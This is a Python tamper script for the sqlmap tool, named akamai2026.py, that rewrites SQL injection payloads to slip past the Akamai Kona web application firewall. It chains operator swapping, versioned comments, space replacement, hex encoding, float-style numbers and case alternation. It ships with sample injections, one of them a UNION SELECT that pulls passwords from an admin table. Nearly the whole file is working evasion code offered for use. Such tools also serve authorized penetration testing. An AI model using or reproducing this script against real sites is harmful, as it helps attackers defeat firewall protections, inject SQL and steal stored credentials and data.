"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: akamai2026.py
Description: Akamai Kona WAF bypass with aggressive encoding
Author: Regaan
Priority: HIGHEST

Akamai Kona specific behaviors:
- Enterprise-grade detection
- Strong tokenization
- Monitors for encoding tricks
- Rate limiting on suspicious patterns

Techniques:
1. Variable version comments (confuse pattern detection)
2. Aggressive operator encoding
3. Hex encoding for strings
4. Numeric obfuscation (float style)
5. Space to comment replacement
6. Case alternation

Chain with: --tamper=akamai2026,cloudflare2025 for layered bypass
"""

import sys
import os

# Add parent directory to path for framework import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.HIGHEST
except ImportError:
    # Not running in SQLMap context
    pass

from tamper_framework.transformer import SQLTransformer
from tamper_framework.transformations import (
    create_version_comment_vary_rule,
    create_space_replace_rule,
    create_value_encode_rule,
    create_case_alternate_rule,
    create_hex_encode_rule,
    create_numeric_obfuscation_rule,
    create_logical_swap_rule,
)


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    Akamai Kona WAF bypass
    
    Enterprise-grade bypass techniques:
    1. Logical operator swap (AND/OR -> &&/||)
    2. Variable version comments
    3. Space replacement
    4. Operator encoding
    5. Hex strings
    6. Float-style numerics (1 -> 1.0)
    7. Case alternation
    
    Akamai specific:
    - Uses varied MySQL versions in comments
    - Float notation for numbers (less common bypass)
    - Combination approach for enterprise WAF
    
    Example:
        Input:  SELECT * FROM users WHERE id=1 AND name='admin'
        Output: Full enterprise-grade obfuscation
    """
    
    if not payload:
        return payload
    
    # Create transformer
    transformer = SQLTransformer()
    
    # Add rules in correct order for Akamai
    
    # 1. Swap logical operators
    transformer.add_rule(create_logical_swap_rule())
    
    # 2. Variable version comments
    transformer.add_rule(create_version_comment_vary_rule())
    
    # 3. Space replacement
    transformer.add_rule(create_space_replace_rule())
    
    # 4. Operator encoding
    transformer.add_rule(create_value_encode_rule())
    
    # 5. Hex strings
    transformer.add_rule(create_hex_encode_rule())
    
    # 6. Float-style numerics
    transformer.add_rule(create_numeric_obfuscation_rule(style="float"))
    
    # 7. Case alternation
    transformer.add_rule(create_case_alternate_rule())
    
    # Transform
    try:
        result = transformer.transform(payload)
        return result
    except Exception as e:
        # If transformation fails, return original
        return payload


if __name__ == "__main__":
    # Test the tamper script
    test_queries = [
        "SELECT * FROM users WHERE id=1",
        "SELECT * FROM users WHERE id>=5 AND active=1",
        "UNION SELECT password FROM admin WHERE role='admin'",
    ]
    
    print("=" * 70)
    print("Akamai 2026 - Context-Aware Token-Based Tamper Script")
    print("=" * 70)
    
    for query in test_queries:
        result = tamper(query)
        print(f"\nOriginal:    {query}")
        print(f"Transformed: {result}")
